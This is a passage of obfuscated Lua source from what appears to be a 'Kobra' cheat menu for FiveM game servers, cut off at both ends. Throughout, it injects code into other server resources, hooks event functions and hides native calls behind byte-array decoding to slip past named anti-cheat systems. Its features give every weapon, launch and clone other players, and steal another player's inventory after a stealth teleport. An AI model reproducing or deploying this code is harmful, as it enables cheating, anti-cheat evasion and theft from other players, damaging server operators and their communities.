                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end
            end)
        ]],v255,v254));break;end end elseif (GetResourceState("ReaperV4")=="started") then local v697=0 + 0 ;while true do if (v697==(1 + 1)) then SetCurrentPedWeapon(v255,v256,true);Wait(810 -560 );v697=1036 -(912 + 121) ;end if (v697==(0 + 0)) then MachoResourceStop("ox_inventory");MachoResourceStop("ox_lib");v697=1290 -(1140 + 149) ;end if (v697==(2 + 1)) then MachoInjectResource("ReaperV4",[[
            local success = exports["ReaperV4"]:InvokeCPlayer("set", "Weapon:]]   .. v256   .. [[", true, true)
            if success then
                print("Updated Cache Successfully")
            else
                print("Failed to Update Cache")
            end
        ]] );break;end if (v697==(1 -0)) then v251:Notify("success","Kobra","Spawned Weapon via ReaperV4 fallback",558 + 2442 );GiveWeaponToPed(v255,v256,9999,false,true);v697=2;end end elseif (GetResourceState("FiniAC")=="started") then local v849=0;while true do if (v849==(3 -2)) then v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,string.format([[
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end

                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end

                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end

                local function _w(n)
                    return Citizen.Wait(n)
                end

                local function _s()
                    local ped = _g(_b("PlayerPedId"))()
                    local coords = _g(_b("GetEntityCoords"))(ped)
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end
                _s()
            ]],v254));break;end if (v849==(0 -0)) then v251:Notify("info","Kobra","Spawned Weapon Bypass #1",518 + 2482 );MachoResourceStop("ox_inventory");v849=3 -2 ;end end else local v850=0;while true do if (v850==(187 -(165 + 21))) then v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,string.format([[
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end

                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end

                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end

                local function _w(n)
                    return Citizen.Wait(n)
                end

                local function _s()
                    local ped = _g(_b("PlayerPedId"))()
                    local coords = _g(_b("GetEntityCoords"))(ped)
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end

                _s()
            ]],v254));break;end if (v850==0) then v251:Notify("info","Kobra","Spawned Weapon Bypass #2",3000);MachoResourceStop("ox_inventory");v850=112 -(61 + 50) ;end end end end;v12.GiveAllWeapons=function(v258) v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        local function _w(n)
            return Citizen.Wait(n)
        end

        if not _G.allWeaponsGiven then
            _G.allWeaponsGiven = true
            _G.originalWeapons = {}
            
            local weapons = {
                "WEAPON_KNIFE", "WEAPON_NIGHTSTICK", "WEAPON_HAMMER", "WEAPON_BAT", "WEAPON_CROWBAR",
                "WEAPON_GOLFCLUB", "WEAPON_BOTTLE", "WEAPON_DAGGER", "WEAPON_HATCHET", "WEAPON_KNUCKLE",
                "WEAPON_MACHETE", "WEAPON_SWITCHBLADE", "WEAPON_WRENCH", "WEAPON_BATTLEAXE", "WEAPON_POOLCUE",
                "WEAPON_STONE_HATCHET", "WEAPON_CANDYCANE", "WEAPON_ANTIQUE_CABINET", "WEAPON_BROOM",
                "WEAPON_GUSENBERG", "WEAPON_MUSKET", "WEAPON_DBSHOTGUN", "WEAPON_AUTOSHOTGUN", "WEAPON_SWEEPERSHOTGUN",
                "WEAPON_ASSAULTRIFLE", "WEAPON_CARBINERIFLE", "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE",
                "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE", "WEAPON_MILITARYRIFLE", "WEAPON_HEAVYRIFLE",
                "WEAPON_TACTICALRIFLE", "WEAPON_PISTOL", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL",
                "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL",
                "WEAPON_FLAREGUN", "WEAPON_MARKSMANPISTOL", "WEAPON_MACHINEPISTOL", "WEAPON_VPISTOL",
                "WEAPON_PISTOLXM3", "WEAPON_CERAMICPISTOL", "WEAPON_GADGETPISTOL", "WEAPON_MICROSMG",
                "WEAPON_SMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG", "WEAPON_COMBATPDW", "WEAPON_GUSENBERG",
                "WEAPON_MACHINEPISTOL", "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_PUMPSHOTGUN",
                "WEAPON_SWEEPERSHOTGUN", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_BULLPUPSHOTGUN", "WEAPON_ASSAULTSHOTGUN",
                "WEAPON_MUSKET", "WEAPON_HEAVYSHOTGUN", "WEAPON_DBSHOTGUN", "WEAPON_AUTOSHOTGUN", "WEAPON_SNIPERRIFLE",
                "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE", "WEAPON_MARKSMANRIFLE_MK2",
                "WEAPON_GRENADELAUNCHER", "WEAPON_GRENADELAUNCHER_SMOKE", "WEAPON_RPG", "WEAPON_MINIGUN",
                "WEAPON_FIREWORK", "WEAPON_RAILGUN", "WEAPON_HOMINGLAUNCHER", "WEAPON_GRENADE", "WEAPON_BZGAS",
                "WEAPON_SMOKEGRENADE", "WEAPON_FLARE", "WEAPON_MOLOTOV", "WEAPON_STICKYBOMB", "WEAPON_PROXMINE",
                "WEAPON_SNOWBALL", "WEAPON_PIPEBOMB", "WEAPON_BALL", "WEAPON_PETROLCAN", "WEAPON_HAZARDCAN",
                "WEAPON_FERTILIZERCAN", "WEAPON_FLAREGUN", "WEAPON_BALL", "WEAPON_KNUCKLE", "WEAPON_HATCHET",
                "WEAPON_MACHETE", "WEAPON_SWITCHBLADE", "WEAPON_WRENCH", "WEAPON_BATTLEAXE", "WEAPON_POOLCUE",
                "WEAPON_STONE_HATCHET", "WEAPON_CANDYCANE", "WEAPON_ANTIQUE_CABINET", "WEAPON_BROOM"
            }
            
            local ped = _g(_b("PlayerPedId"))()
            
            for _, weaponName in ipairs(weapons) do
                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                if _g(_b("HasPedGotWeapon"))(ped, weaponHash, false) then
                    _G.originalWeapons[weaponHash] = _g(_b("GetAmmoInPedWeapon"))(ped, weaponHash)
                end
            end
            
            for _, weaponName in ipairs(weapons) do
                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
            end
            
            _g(_b("SetCurrentPedWeapon"))(ped, _g(_b("GetHashKey"))("WEAPON_UNARMED"), true)
        end
    ]]);end;v12.RemoveAllWeapons=function(v259) v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        if _G.allWeaponsGiven then
            _G.allWeaponsGiven = false
            
            local ped = _g(_b("PlayerPedId"))()
            
            _g(_b("RemoveAllPedWeapons"))(ped, true)
            
            if _G.originalWeapons then
                for weaponHash, ammo in pairs(_G.originalWeapons) do
                    if ammo > 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, ammo, false, true)
                    end
                end
            end
            
            _G.originalWeapons = {}
        end
    ]]);end;v12.HandleLaunchPlayer=function(v260,v261,v262) local v263=0 + 0 ;local v264;local v265;while true do if (v263==0) then if ( not v261 or ( #v261==(0 -0))) then return;end v264=tonumber(v261[1]);v263=1 -0 ;end if (v263==3) then CreateThread(function() local v698=0 + 0 ;local v699;local v700;local v701;local v702;local v703;local v704;local v705;local v706;local v707;while true do if (v698==(1461 -(1295 + 165))) then v701=PlayerPedId();if  not v701 then return;end v702=GetEntityCoords(v701);v703=GetEntityCoords(v700);v698=1 + 1 ;end if (v698==(3 + 2)) then if v705 then SetEntityVisible(v701,true,1397 -(819 + 578) );end break;end if (v698==0) then v699=GetPlayerFromServerId(v264);if ( not v699 or (v699== -(1403 -(331 + 1071)))) then return;end v700=GetPlayerPed(v699);if ( not v700 or  not DoesEntityExist(v700)) then return;end v698=744 -(588 + 155) ;end if (v698==(1286 -(546 + 736))) then for v969=1938 -(1834 + 103) ,10 + 5  do if  not DoesEntityExist(v700) then break;end local v970=GetEntityCoords(v700);if  not v970 then break;end SetEntityCoords(v701,v970.x,v970.y,v970.z + (0.5 -0) ,false,false,false,false);Wait(1816 -(1536 + 230) );AttachEntityToEntityPhysically(v701,v700,491 -(128 + 363) ,0,0,0 + 0 ,373 -223 ,0,0 + 0 ,0 -0 ,0 -0 ,0 -0 ,1,false,false,1 + 0 ,2);Wait(1059 -(615 + 394) );DetachEntity(v701,true,true);Wait(91 + 9 );end Wait(500);ClearPedTasksImmediately(v701);if v706 then local v1028=0 + 0 ;while true do if (v1028==1) then SetEntityCoords(v701,v706.x,v706.y,v706.z,false,false,false,false);break;end if ((0 -0)==v1028) then SetEntityCoords(v701,v706.x,v706.y,v706.z + (4 -3) ,false,false,false,false);Wait(100);v1028=652 -(59 + 592) ;end end end v698=5;end if (v698==(6 -3)) then if (v704>(18 -8)) then local v1029=0 + 0 ;local v1030;local v1031;local v1032;local v1033;local v1034;while true do if (v1029==(172 -(70 + 101))) then v1031=math.random(12 -7 ,7 + 2 );v1032=math.cos(v1030) * v1031 ;v1029=4 -2 ;end if (v1029==3) then SetEntityCoordsNoOffset(v701,v1034.x,v1034.y,v1034.z,false,false,false);SetEntityVisible(v701,false,0);v1029=4;end if ((245 -(123 + 118))==v1029) then v705=true;Wait(100);break;end if (v1029==(1 + 1)) then v1033=math.sin(v1030) * v1031 ;v1034=vector3(v703.x + v1032 ,v703.y + v1033 ,v703.z);v1029=1 + 2 ;end if (v1029==0) then v706=v702;v1030=math.random() * (1401 -(653 + 746)) * math.pi ;v1029=1;end end end v707=v265(v703,v262);if ( #v707==(0 -0)) then end ClearPedTasksImmediately(v701);v698=4;end if (v698==2) then if ( not v702 or  not v703) then return;end v704= #(v702-v703);v705=false;v706=nil;v698=3;end end end);break;end if (v263==1) then if  not v264 then return;end v262=v262 or (4322 -1322) ;v263=2;end if (v263==(5 -3)) then v265=nil;function v265(v708,v709) local v710=0;local v711;local v712;while true do if (v710==(0 + 0)) then v711={};v712=PlayerPedId();v710=1 + 0 ;end if (v710==(1 + 0)) then if  not v712 then return v711;end for v971=0 + 0 ,40 + 215  do local v972=0 -0 ;local v973;while true do if ((0 + 0)==v972) then v973=GetPlayerFromServerId(v971);if (v973 and (v973~= -1) and DoesEntityExist(GetPlayerPed(v973))) then local v1338=0;local v1339;local v1340;while true do if (v1338==(0 -0)) then v1339=GetPlayerPed(v973);v1340=GetEntityCoords(v1339);v1338=1235 -(885 + 349) ;end if (v1338==1) then if v1340 then local v1517= #(v708-v1340);if (v1517<=v709) then table.insert(v711,{player=v973,serverId=v971});end end break;end end end break;end end end v710=2;end if ((2 + 0)==v710) then return v711;end end end v263=8 -5 ;end end end;v12.HandleClonePlayer=function(v266,v267) local v268=0 -0 ;local v269;while true do if (0==v268) then if ( not v267 or ( #v267==0)) then return;end v269=table.concat(v267,",");v268=1;end if (v268==1) then MachoInjectResourceRaw("any",string.format([[
        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function g(n)
            return _G[decode(n)]
        end
        local function wait(n)
            return Citizen.Wait(n)
        end
        local function findClientIdByServerId(sid)
            local players = g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
            for _, pid in ipairs(players) do
                if g({71,101,116,80,108,97,121,101,114,83,101,114,118,101,114,73,100})(pid) == sid then
                    return pid
                end
            end
            return nil
        end
        local playerIds = {%s}
        for _, targetServerId in ipairs(playerIds) do
            local clientId = findClientIdByServerId(targetServerId)
            local ped = clientId and g({71,101,116,80,108,97,121,101,114,80,101,100})(clientId) or nil
            if ped and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(ped) then
                local coords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
                local hash = g({71,101,116,69,110,116,105,116,121,77,111,100,101,108})(ped)
                g({82,101,113,117,101,115,116,77,111,100,101,108})(hash)
                while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(hash) do
                    wait(0)
                end
                g({67,114,101,97,116,101,80,101,100})(4, hash, coords.x, coords.y, coords.z, 0.0, true, true)
            end
        end
    ]],v269));break;end end end;v12.HandleTakeInventory=function(v270,v271) if ( not v271 or ( #v271==(968 -(915 + 53)))) then return;end local v272=tonumber(v271[802 -(768 + 33) ]);if  not v272 then return;end print("Take Inventory action executed for players: "   .. table.concat(v271,", ") );local v273=GetResourceState("WaveShield")=="started" ;if v273 then MachoInjectResourceRaw("ox_inventory",string.format([[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end
        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end
        local function _w(n)
            return Citizen.Wait(n)
        end

        local function findClientIdByServerId(sid)
            local players = _g(_b("GetActivePlayers"))()
            for _, pid in ipairs(players) do
                if _g(_b("GetPlayerServerId"))(pid) == sid then
                    return pid
                end
            end
            return nil
        end

        local function getSafeNearbyCoord(entity)
            local behind = _g(_b("GetOffsetFromEntityInWorldCoords"))(entity, 0.0, -1.75, 0.0)
            local found, gz = _g(_b("GetGroundZFor_3dCoord"))(behind.x, behind.y, behind.z + 5.0, false)
            if found then behind = vec3(behind.x, behind.y, gz + 0.1) end
            return behind
        end

        local function stealthTeleportToEntity(entity)
            if not entity or not _g(_b("DoesEntityExist"))(entity) then return nil end
            local me = _g(_b("PlayerPedId"))()
            local originalPos = _g(_b("GetEntityCoords"))(me)
            local wasVisible = _g(_b("IsEntityVisible"))(me)
            _g(_b("SetEntityVisible"))(me, false, false)
            _g(_b("SetEntityInvincible"))(me, true)
            _g(_b("SetEntityCollision"))(me, false, false)
            _g(_b("FreezeEntityPosition"))(me, true)
            _w(0)
            local dest = getSafeNearbyCoord(entity)
            if _g(_b("IsPedInAnyVehicle"))(me, false) then
                local veh = _g(_b("GetVehiclePedIsIn"))(me, false)
                if veh and veh ~= 0 then
                    _g(_b("SetEntityCoordsNoOffset"))(veh, dest.x, dest.y, dest.z, true, true, true)
                else
                    _g(_b("SetEntityCoordsNoOffset"))(me, dest.x, dest.y, dest.z, true, true, true)
                end
            else
                _g(_b("SetEntityCoordsNoOffset"))(me, dest.x, dest.y, dest.z, true, true, true)
            end
            _w(50)
            _g(_b("FreezeEntityPosition"))(me, false)
            _g(_b("SetEntityCollision"))(me, true, true)
            _g(_b("SetEntityInvincible"))(me, false)
            _g(_b("SetEntityVisible"))(me, wasVisible, false)
            return originalPos
        end

        local function restoreOriginalPosition(entity, originalPos)
            if not originalPos then return end
            _g(_b("FreezeEntityPosition"))(entity, true)
            if _g(_b("IsPedInAnyVehicle"))(entity, false) then
                local veh = _g(_b("GetVehiclePedIsIn"))(entity, false)
                if veh and veh ~= 0 then
                    _g(_b("SetEntityCoordsNoOffset"))(veh, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                else
                    _g(_b("SetEntityCoordsNoOffset"))(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                end
            else
                _g(_b("SetEntityCoordsNoOffset"))(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
            end
            _w(50)
            _g(_b("FreezeEntityPosition"))(entity, false)
        end

        local function forceHandsUp(entity)
            local animDict, animName = "missminuteman_1ig_2", "handsup_base"
            _g(_b("RequestAnimDict"))(animDict)
            while not _g(_b("HasAnimDictLoaded"))(animDict) do _w(10) end
            _g(_b("TaskPlayAnim"))(entity, animDict, animName, 8.0, -8.0, -1, 49, 0, false, false, false)
        end

        -- === ONLY CHANGE: NO CreateThread ===
        local co = coroutine.create(function()
            _w(100)
            local targetServerId = %d
            local clientId = findClientIdByServerId(targetServerId)
            local targetPed = clientId and _g(_b("GetPlayerPed"))(clientId) or nil
            if targetPed and _g(_b("DoesEntityExist"))(targetPed) then
                local me = _g(_b("PlayerPedId"))()
                local originalPos = stealthTeleportToEntity(targetPed)
                _w(100)
                forceHandsUp(targetPed)
                _g(_b("TriggerEvent"))("ox_inventory:openInventory", "otherplayer", _g(_b("GetPlayerServerId"))(clientId))
                _w(100)
                restoreOriginalPosition(me, originalPos)
            end
        end)
        while coroutine.status(co) ~= "dead" do
            local ok, err = coroutine.resume(co)
            if not ok then print("Kobra Coroutine error:", err); break end
            _w(0)
        end
    ]],v272));else MachoInjectResource2(NewThreadNs,"ox_inventory",string.format([[
        local function findClientIdByServerId(sid)
            local players = GetActivePlayers()
            for _, pid in ipairs(players) do
                if GetPlayerServerId(pid) == sid then
                    return pid
                end
            end
            return nil
        end

        local function getSafeNearbyCoord(entity)
            local behind = GetOffsetFromEntityInWorldCoords(entity, 0.0, -1.75, 0.0)
            local found, gz = GetGroundZFor_3dCoord(behind.x, behind.y, behind.z + 5.0, false)
            if found then behind = vec3(behind.x, behind.y, gz + 0.1) end
            return behind
        end

        local function stealthTeleportToEntity(entity)
            if not entity or not DoesEntityExist(entity) then return nil end
            local me = PlayerPedId()
            local originalPos = GetEntityCoords(me)
            local wasVisible = IsEntityVisible(me)
            SetEntityVisible(me, false, false)
            SetEntityInvincible(me, true)
            SetEntityCollision(me, false, false)
            FreezeEntityPosition(me, true)
            Citizen.Wait(0)
            local dest = getSafeNearbyCoord(entity)
            if IsPedInAnyVehicle(me, false) then
                local veh = GetVehiclePedIsIn(me, false)
                if veh and veh ~= 0 then
                    SetEntityCoordsNoOffset(veh, dest.x, dest.y, dest.z, true, true, true)
                else
                    SetEntityCoordsNoOffset(me, dest.x, dest.y, dest.z, true, true, true)
                end
            else
                SetEntityCoordsNoOffset(me, dest.x, dest.y, dest.z, true, true, true)
            end
            Citizen.Wait(50)
            FreezeEntityPosition(me, false)
            SetEntityCollision(me, true, true)
            SetEntityInvincible(me, false)
            SetEntityVisible(me, wasVisible, false)
            return originalPos
        end

        local function restoreOriginalPosition(entity, originalPos)
            if not originalPos then return end
            FreezeEntityPosition(entity, true)
            if IsPedInAnyVehicle(entity, false) then
                local veh = GetVehiclePedIsIn(entity, false)
                if veh and veh ~= 0 then
                    SetEntityCoordsNoOffset(veh, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                else
                    SetEntityCoordsNoOffset(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                end
            else
                SetEntityCoordsNoOffset(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
            end
            Citizen.Wait(50)
            FreezeEntityPosition(entity, false)
        end

        local function forceHandsUp(entity)
            local animDict, animName = "missminuteman_1ig_2", "handsup_base"
            RequestAnimDict(animDict)
            while not HasAnimDictLoaded(animDict) do Citizen.Wait(10) end
            TaskPlayAnim(entity, animDict, animName, 8.0, -8.0, -1, 49, 0, false, false, false)
        end

        local targetServerId = %d
        local clientId = findClientIdByServerId(targetServerId)
        local targetPed = clientId and GetPlayerPed(clientId) or nil
        if targetPed and DoesEntityExist(targetPed) then
            local me = PlayerPedId()
            local originalPos = stealthTeleportToEntity(targetPed)
            Citizen.Wait(100)
            forceHandsUp(targetPed)
            TriggerEvent("ox_inventory:openInventory", "otherplayer", GetPlayerServerId(clientId))
            Citizen.Wait(100)
            restoreOriginalPosition(me, originalPos)
        end
    ]],v272));end end;v12.BuildMenuFromWeaponList=function(v274,v275) local v276=0;local v277;while true do if (v276==(0 -0)) then v277={};for v713,v714 in ipairs(v275) do if v46[v714] then v277[ #v277 + (1 -0) ]=v46[v714].label;end end v276=329 -(287 + 41) ;end if (v276==(848 -(638 + 209))) then return v277;end end end;v12.GetWeaponModelFromLabel=function(v278,v279) for v339,v340 in pairs(v46) do if (v340.label==v279) then return v339;end end return "";end;v12.RepairVehicle=function(v280) v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        local function _w(n)
            return Citizen.Wait(n)
        end

        local ped = _g(_b("PlayerPedId"))()
        local vehicle = _g(_b("GetVehiclePedIsIn"))(ped, false)
        
        if vehicle and vehicle ~= 0 and _g(_b("DoesEntityExist"))(vehicle) then
            _g(_b("SetVehicleFixed"))(vehicle)
            _g(_b("SetVehicleDeformationFixed"))(vehicle)
            _g(_b("SetVehicleUndriveable"))(vehicle, false)
            _g(_b("SetVehicleEngineOn"))(vehicle, true, true, true)
            _g(_b("SetVehicleEngineHealth"))(vehicle, 1000.0)
            _g(_b("SetVehicleBodyHealth"))(vehicle, 1000.0)
            _g(_b("SetVehiclePetrolTankHealth"))(vehicle, 1000.0)
            _g(_b("SetVehicleFuelLevel"))(vehicle, 100.0)
        end
    ]]);end;local v92=GetResourceState("ReaperV4")=="started" ;local v93=GetResourceState("WaveShield")=="started" ;local v94=GetResourceState("qb-jail")=="started" ;v12.BuildDefaultMenu=function(v281) v16={{label="Self",type="subMenu",categories={{label="Player",tabs={{type="button",label="Revive",desc="This will attempt to revive you by script.",onSelect=function() local v341=0 + 0 ;local v342;while true do if (v341==(0 -0)) then v342={amigo=function() v48("amigo",[[ respawnPlayer() ]]);end,TrappinBridge=function() v48("new",[[ LocalPlayer.state:set('isDead', false, true) ]]);end,["rzrp-base"]=function() MachoInjectResource2(AsThreadNs,"rzrp-base",[[
                                        local ped = PlayerPedId()
                                        if ped and DoesEntityExist(ped) then
                                            local coords = GetEntityCoords(ped)
                                            local heading = GetEntityHeading(ped)
                                            NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
                                            SetEntityHealth(ped, 200)
                                            ClearPedBloodDamage(ped)
                                            ClearPedTasksImmediately(ped)
                                            SetPlayerInvincible(PlayerId(), false)
                                            SetEntityInvincible(ped, false)
                                            SetPedCanRagdoll(ped, true)
                                            SetPedCanRagdollFromPlayerImpact(ped, true)
                                            SetPedRagdollOnCollision(ped, true)
                                        end
                                    ]]);end,FiveStar=function() MachoInjectResourceRaw("FiveStar",[[
                                    if not _G.Kobra then
                                            _G.Kobra = {
                                                TEvent = function(...) end,
                                                TSEvent = function(...) end
                                            }
                                        end

                                        local function HookNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...)
                                                print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        HookNative("TriggerEvent", function(originalFn, eName, ...)
                                            _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                            return originalFn(eName, ...)
                                        end)

                                        HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                            _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                            return originalFn(eName, ...)
                                        end)

                                        _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                        _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield Coroutine error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            Citizen.Wait(1000)
                                            _G.Kobra.TSEvent('revive:Player:Dead')
                                        end)
                                    ]]);end,scripts=function() if (GetResourceState("scripts")=="started") then if v93 then TriggerEvent("deathscreen:revive");elseif v92 then MachoInjectThread(0 -0 ,"scripts","",[[
                                                        TriggerEvent('deathscreen:revive')
                                                    ]]);else TriggerEvent("deathscreen:revive");end end end,framework=function() if (GetResourceState("framework")=="started") then if v93 then TriggerEvent("deathscreen:revive");elseif v92 then MachoInjectThread(0,"framework","",[[
                                                        TriggerEvent('deathscreen:revive')
                                                    ]]);else TriggerEvent("deathscreen:revive");end end end,["qb-jail"]=function() if v94 then if v92 then MachoInjectThread(0 + 0 ,"scripts","",[[
                                                    TriggerEvent('hospital:client:Revive')
                                                ]]);else TriggerEvent("hospital:client:Revive");end end end,wasabi_ambulance=function() print("2");local v760=GetResourceState("WaveShield")=="started" ;local v761=GetResourceState("ReaperV4")=="started" ;if v760 then MachoInjectResourceRaw("wasabi_ambulance",[[
                                    if not _G.Kobra then
                                        _G.Kobra = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.Kobra.TEvent("esx:onPlayerSpawn")
                                        _G.Kobra.TSEvent("esx:onPlayerSpawn")
                                    end)
                                    ]]);elseif v761 then MachoInjectThread(0 + 0 ,"wasabi_ambulance","",[[
                                    if not _G.Kobra then
                                        _G.Kobra = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.Kobra.TEvent("esx:onPlayerSpawn")
                                        _G.Kobra.TSEvent("esx:onPlayerSpawn")
                                    end)
                                    ]]);else MachoInjectResourceRaw("wasabi_ambulance",[[
                                    if not _G.Kobra then
                                        _G.Kobra = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.Kobra.TEvent("esx:onPlayerSpawn")
                                        _G.Kobra.TSEvent("esx:onPlayerSpawn")
                                    end)
